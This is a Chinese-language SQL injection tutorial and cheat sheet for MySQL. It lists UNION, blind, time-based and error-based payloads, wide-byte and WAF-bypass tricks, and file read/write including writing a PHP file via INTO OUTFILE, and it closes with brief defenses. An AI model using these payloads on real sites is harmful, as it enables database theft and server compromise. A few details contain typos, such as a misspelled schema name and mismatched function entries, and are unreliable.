# SQL注入学习文档
<h2 id=menu>目录</h2>  
*顺序并不代表什么，可以看想看的*

1. ### [什么是SQL注入?](#1)
2. ### [SQL注入的分类](#2)
3. ### [Mysql数据库的特点](#3)
4. ### [手工注入流程](#4)
5. ### [注入时的常用注释](#5)
6. ### [报错注入](#6)
7. ### [堆叠注入](#7)
8. ### [二次注入](#8)
9. ### [宽字节注入](#9)
10. ### [一些其他的注入点](#10) 
11. ### [一些绕过手法](#11)
12. ### [防御手段](#12)
13. ### [字符型注入闭合符号](#13)
14. ### [文件读写](#14)
15. ### [信息收集](#15)
***

> <h2 id="1">0x01 什么是SQL注入?</h2>
`SQL注入是一种通过操作输入来修改后台SQL语句，以达到利用代码进行攻击的技术`
<h3>SQL注入攻击原理</h3>

```
首先了解一下的WEB应用三层结构（常见）
    表现层（浏览器，运行在客户端）
            ↓
    逻辑层（代码脚本，运行在服务器）
            ↓
    数据层（数据库）

    SQL注入攻击就发生在，逻辑层处理表现层提交数据的时候。

```
下面看代码
```php
    $sql = " SELECT name FROM User WHERE id=$_GET[num] ";
    $result = $con ->query($sql);
    /*
    注意看这里的$_GET[num]这个参数，这个参数是用户可控的，并且没有做任何过滤，那么如果用户提交的url是这样的.
    http://xxx.xxx.com/index.php?num=1+union+select+*+FROM+User;

    当服务器脚本接受到数据后，往里面一拼接，就会形成
    SELECT name FROM User WHERE id=1 UNION SELECT * FROM User
    这样就产生了SQL注入
    */
```

> <h2 id="2">0x02 SQL注入的分类</h2>
#### 按数据类型分
    * 数值型 
    * 字符型
    **
        注入的时候这两个类型的区别很重要，如何简单的判断类型呢？可以做减法，乘，除，来进行判断，就是别用+号，因为浏览器会将它转为空格，就会报错，如果是数值类型，那么进行运算的话，回显结果应该是运算的结果，
        例如 id=2-1,那么就应该返回id=1的数据，如果是字符类型的话，进行运算是无效的，它会把从运算符开始的字符全部丢弃。
    **
#### 按HTTP提交的方法分
    * GET
    * POST
#### 按注入方式分
    * 报错注入
    * 盲注
        # 延时注入
        # 布尔注入
    * UNION
#### 编码问题
    宽字节注入(GBK)

> <h2 id="3">0x03 Mysql数据库的特点</h2>
```
主要是说MySQL 5.0以上版本的INFORMATION_SCHEMA这个表，它里面存储了MYSQL所维护的所有其他数据库的信息，如数据库名，数据库的表，表中的字段，以及字段值。

下面写一下主要的表
    * SCHEMATA 存储mysql所有数据库的基本信息，包括数据库名
        # SCHEMA_NAME 这个字段存储了数据库名
    * TABLES 存储mysql中所有表的信息
        # TABLE_SCHEMA 表所在的数据库
        # TABLE_NAME 表名
    * COLUMNS 存储mysql中所有列的信息
        # TABLE_NAME 字段所在的表
        # COLUMN_NAME 字段名
```

> <h2 id=4>0x04 手工注入流程</h2>
* 先找到注入点，根据情况进行注入
#### 假设注入点存在(mysql)
1. 获取字段数
```sql
1. order by n #通过不断改变n的值,来观察反应获取字段数
2. union select n1,n2,... #通过不断增加字段观察页面反应获取字段数
```
2. 获取当前数据库名（假设字段数为2）
```sql
1. select 1,database()
```
3. 获取当前库中的表
```sql
1. select 1,group_concat(table_name) from information_schema.tables where table_schema = database()
# group_concat()这个函数可以把索引到的数据拼接成一组然后返回。
2. select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1
#这种情况下的话，一次只会返回一条我们需要的数据，那就要修改Limit后面的两个数字，没获取一次就全部+1
```
4. 获取当前表中的字段（假设这里已经获取到了users表）
```sql
select 1,group_concat(column_name) from infromation_schema.columns where table_schema = database() and table_name = "users"
```
5. 获取各个字段的值(假设获取到了username，password两个字段)
```sql
select 1,group_concat(username,'-',password) from users
```
* 上面其实主要是用于可以看到数据的注入方法，例如报错注入，union注入，如果碰到盲注的话，方法可能会稍有不同
#### 盲注方法
```sql
#获取库名，表名，字段名什么的还是用上面那些方法，不过我们要通过枚举获取数据，下面说下方法，这里假设以获取表名为例

select 1,length(table_name) from information_schema.tables where table_schema = database() limit 0,1;
#先通过length()方法获取第一条数据的长度，知道长度之后，方便枚举

select 1,substr( (select table_name from information_schema.tables where table_schema = database() limit 0,1 ) ,1,1)
#这里使用substr(str,pos,len)这个函数来对返回的字符进行截取，从pos位置截取len长度的字符，进行返回，这里的话获取到了第一行的数据之后，就要不停的改变pos或者len来匹配字符，不过建议配合ascii()函数使用，因为这样效率会快一些，这样的话就改变pos就好了

select 1,ascii( substr( (select table_name from information_schema.tables where table_schema = database() limit 0,1 ) ,1,1) )
#ascii(str)函数会把括号中的字符作为ascii码返回，这的话可以使用2分法去对字符进行枚举
```

### 其他盲注函数
* ord()函数效果和ascii()类似
* mid()和substr()一样
* reserver(str) 把str倒序然后返回
* like匹配
* regexp 比较重要的正则注入 
    * regexp,使用正则表达式进行注入也可以比较快的确定字符范围，而且它是默认不区分大小写的，如果要区分的话可以用 regexp binary
    * `select 1 from information_schema.tables where table_schema=database() and table_name regexp "正则" limit 0,1;`

### 延时注入使用函数
如果是碰到延时注入，那么需要配合if()函数使用  
if(表达式，为真执行这个，为假执行这个)
* sleep(num) 延迟num秒返回数据  
    `注意如果查询的参数不存在，那么sleep也不会被执行，那么到时候可能会造成不存在注入的假象`
* benchmark(count,expr) 执行count次expr(表达式)，可以通过增加计算量来达到延迟效果
* rpad(str,len,padstr) 返回字符串 str, 其右边由字符串padstr 填补到len 字符长度。假如str 的长度大于len, 则返回值被缩短至 len 字符。
* repeat(str,count) 返回由字符串str重复count次的字符串， 如果计数小于1，则返回一个空字符串。返回NULL如果str或count为NULL。
* rlike 和regexp一样，可以通过多次正则来消耗资源

> <h2 id="5">0x05 注入时的常用注释</h2>
* /**/ 这个注释符主要是进行多行注释，在使用时可以只写 /* 来达到注释后面语句的效果
* \# 注释一行
* --+ 注释一行，注意其实是--（空格），只不过在url地址栏中空格老是会被转码，所以使用+代替，因为+会被转为空格
* /\*!\*/ 内联注释,在内联注释中的语句是会被执行的
    ```
    关于内联注释，还可以这样写/*!50000select*/,这样是没问题的，可以执行的，50000=>数字>=10000,填这个范围内的数字都是OK的
    ```

> <h2 id="6">0x06 报错注入</h2>
* floor() & rand()
    ```sql
    利用手法:
    and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
    #注意这里的floor报错函数写在了from后面，这里是很关键的，第一个select后面不支持多个参数，最多只能写一个，不然就会报错，所以才要把报错语句写在from后面
    #为什么会报错？，如果你select没有用括号包起的话，多个参数是没问题的，但是用了and被括号包起来的select就会有问题，我觉得可能和select (1,2,3)这种行为差不多，这个也会报错
    ```
    ```
    这个方法的核心是用floor配合rand函数在配合group by进行报错，所以floor(rand(0)*2)写哪里无所谓，但是要有，而且一定要用group by 去对他进行排序才行。
    ```
* extractvalue()
    ```sql
        利用手法:
        and (extractvalue(1,concat("~",(select database()))))
    ```
    ```
        这个函数的利用手法在于它的第二个参数，本来是要写xml文档的路径的，但是我们写一个不属于xml文档路径的格式符号在里面就会报错。
    ```
* updatexml()
    ```sql
        利用手法:
        and (updatexml(1,concat('~',(select database()),'~'),3))
        #这个函数的操作点就在中间位置
    ```
* geometrycollection()
    ```sql
        利用手法:
        and geometrycollection((select * from(select * from(select user())a)b))
    ```
* multipoint()
    ```sql
        利用手法:
        and multipoint((select * from(select * from(select user())a)b))
    ```
* polygon()
    ```sql
        利用手法:
        and polygon((select * from(select * from(select user())a)b))
    ```
* multipolygon()
    ```sql
        利用手法:
        and multipolygon((select * from(select * from(select user())a)b))
    ```
* linestring()
    ```sql
        利用手法:
        and multilinestring((select * from(select * from(select user())a)b))
    ```
* multilinestring()
    ```sql
        利用手法:
        and multilinestring((select * from(select * from(select user())a)b))
    ```
* exp()
    ```sql
        利用手法:
        and (exp(~(select * from(select user())a)))
    ```
>  <h2 id="7">0x07 堆叠注入</h2>
### 触发条件
```
当遇到堆叠注入时，恶意用户是可以自己构造想要的SQL语句的，而不是说，脚本上写了SELECT就只能通过改变参数去利用SELECT，但是堆叠注入的出现是有条件的，得看执行sql语句的函数支不支持多条sql语句执行，就拿php来说。  
```
PHP5.x版本使用的以下函数  
`mysqli_multi_query()`可以执行多条sql语句  
`mysql_query`只能执行一条sql语句  
也就是说，如果目标脚本用的函数是只能执行一条sql语句的话，那么也不存在堆叠注入

> <h2 id="8">0x08 二次注入</h2>
### 触发条件
```
1.恶意语句被代码转义
2.数据库取出数据时，不做任何处理，直接给用户
```

> <h2 id="9">0x09 宽字节注入</h2>
### 触发条件
```
1. 传入的一些特殊符号是会被过滤的，例如,单双引号
2. 数据库的编码为GBK
```

### 触发过程
```php
" select 1 from user where id='$_GET[val]' "
/*
    可以看到变量被'包围了，假设之前有过滤函数会把单引号转义

    当我们提交参数 ' and 1=1 --+
    实际上数据库接收到的是,\被编码为%5c
    select 1 from user where id=%5c' and 1=1 --+
    可以看到绕过是失败的

    如果提交的参数是 %df' and 1=1 --+的话
    实际上数据库接收到的是
    select 1 from user where id=%df%5c' and 1=1 --+
    在GBK编码中，两个字符组成一个汉字，而%df%5c组成一个汉字，单引号成功逃逸
*/
```

> <h2 id="10">0x0A 一些其他的注入点</h2>
* cookie注入
* base64注入
* XFF注入

> <h2 id="11">0x0B 一些绕过手法</h2>
* 大小写绕过
* 双写绕过
* 编码绕过
    * 使用CHAR（）函数，把字符变成ASCII码绕过
    * 16进制绕过(字符编程16进制，然后0x编码)  
    `注意：上面这两种方法都是用来绕过数值型的防御的，如果是字符型，不破限制是用不了的`
* 内联注释绕过
* 关键字绕过
* HTTP参数污染
* 空格绕过
    * /**/ 使用注释代替空格
    * %09 TAB键（水平）
    * %0a 新建一行
    * %0c 新的一页
    * %0d return 功能
    * %0b TAB键（垂直）
    * %a0 空格

* %00绕过
* 加特殊值  
    1.*9e0  
        ```
        在第一个关键字前面加*9e0语句是可以成功被查询的，例如
        ?id=1' *9e0union select 1 --+
        这个语句是可以执行的，但是把*9e0加到其他位置就会报错，只有加到第一个关键字前面，我也不知道是为什么
       ```   
* 分块过WAF
    * 在HTTP请求头中添加以下请求头 Transfer-Encoding: chunked 添加了这个头后，就可以进行分段传输，注意要用在POST请求下
    * 下面是bp抓的一个包
    ```http
        POST /test.php HTTP/1.1
        Host: localhost
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Cookie: wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1599795094
        Upgrade-Insecure-Requests: 1
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 27
        Transfer-Encoding: chunked
        # 注意添加上面这个头

        2 #这个数字为下面字符的长度
        id
        2
        =1
        0 #结束分段，写个0，加两个空格

        
    ```

> <h2 id="12">0x0C 防御手段</h2>
### 代码层防御
    * 使用 addslashes() 对特殊字符进行转义(',",#,-,/,*),使用这个要注意，参数一定要有引号包裹，得是字符串，如果是数值型注入的话，这个函数加了和没加一样
    * 对一些函数名和关键字进行正则匹配过滤，匹配到了直接停止查询，抛出警告,千万不要把匹配到的字符替换为空，这种处理方法很糟糕
    * 关闭错误回显
    * 使用预编译
### 中间层防御
    * 加WAF

> <h2 id="13">0x0D 字符型注入闭合符号</h2>
关于注入时闭合符号的问题，下面的例子展示了，在提交参数的地方是可以有多对符号的，有时候我们进行注入可能对方并没有做太多过滤，只是我们没有绕过而已，所以建议可以在确认有注入点的地方，加载一个闭合字典，试试能不能绕过
```php
    include_once("./connect.php");
    $id = $_GET['id'];
    //数值类型，这种类型如果接受到了一个字符就会报错，如果前面没有做任何过滤，这就完蛋了
    // $sql = "SELECT fullName,phoneNumber,email FROM Customer WHERE id=$id LIMIT 0,1";
    //字符类型,分单双引号，但是其实本质是一样的
    $sql = "SELECT fullName,phoneNumber,email FROM Customer WHERE id='$id' LIMIT 0,1";
    // $sql = 'SELECT fullName,phoneNumber,email FROM Customer WHERE id='.'"'.$id.'"'.'LIMIT 0,1';
    //但是有些人会把字符类型的闭合变得很复杂，例如,但是这里我发现一个问题，那就是在$id这个地方,括号外面不能有引号包含，如果有的话，那么它传递给SQL的时候也会被当成查询目标，这样就查不到东西了，所以闭合可以有括号，但是这些括号要在引号外面
    // $sql = "SELECT fullName,phoneNumber,email FROM Customer WHERE id=($id) LIMIT 0,1";
    // $sql = "SELECT fullName,phoneNumber,email FROM Customer WHERE id=((('$id'))) LIMIT 0,1";
    $result = $conn->query($sql);
    if($result->num_rows > 0){
        $row = $result->fetch_assoc();
        echo "姓名:$row[fullName]<br/>电话:$row[phoneNumber]<br/>邮箱:$row[email]";
    }else{
        echo "查询失败".$conn->error;
    }
```

> <h2 id="14">0x0E 文件读写</h2>
*要想使用MYSQL的文件操作函数对文件进行操作的话，那是需要配置的，我们可以查看`select @@secure_file_priv`,这个参数，如果是空，那么对导入导出无限制，如果是NULL，那么禁止导入导出，如果值是一个目录，那么就只能像指定目录导入导出，这个参数只能通过修改MYSQL配置文件进行打开。*
```sql
    -- 常用的三个函数
        into dumpfile() //只能操作一行数据，并且保持原数据格式
        into outfile() //可以操作多行数据，数据写文件时会有特殊的格式转换
        load_file() //读取文件
```
dumpfile和outfile的区别
```
    dumpfile()和outfile()的区别，可以看看aaa\naaaa\naaa
    select "a\naaaa\taaaa" into outfile "D:/outfile.txt"
    使用outfile()写入时，\n什么的会有实际作用，也就是会被转义为换行，而dumpfile()则不会处理这种转义字符
```
文件的写入，这里就演示outfie,dumpfile也是一样用，就是记住特点就好了
```
    select "<?php phpinfo(); ?>" into outfile "D:/info.php"; //select后面跟要写入的语句，然后into outfile后面要写绝对路径
    注意：路径需要引号闭合，如果有对引号做过滤，那么就没办法了，因为into outfile后面的只能是字符
```
load_file
```
    做文件读取，也需要文件的绝对路径，而且load_file是可以用CHAR或者0x等编码方式来绕过对引号的过滤的
    select 1,2,load_file("D:/hello.txt");
    select 1,2,load_file(char(68, 58, 47, 104, 101, 108, 108, 111, 46, 116, 120, 116)); //注意不要加""去转义,而且使用编码的时候，要用/而不是\
    select 1,2,load_file(0x443a2f68656c6c6f2e747874);

    //使用load_file去读取源码的话也是有办法的，
    select 1,2,replace(load_file("x.php"),"<",""); //这里用replace函数去把<这个符号给替换了，因为不替换的话，源码可能会被浏览器解析，那么就不会返回代码
```
> <h2 id="15">0x0F 信息收集</h2>
*数据库版本*  
`select @@version`  
*当前用户名*
`select user()`  
*当前数据库*  
`select database()`  
*当前数据库路径*  
`select @@datadir`  
`select @@basedir`  
*是否可以到导入导出文件*  
`select @@secure_file_priv`  
`show global variables like '%secure%'`  
*查看当前权限*  
`(select count(*) from mysql.user) > 0`  
***
[回到顶部](#menu)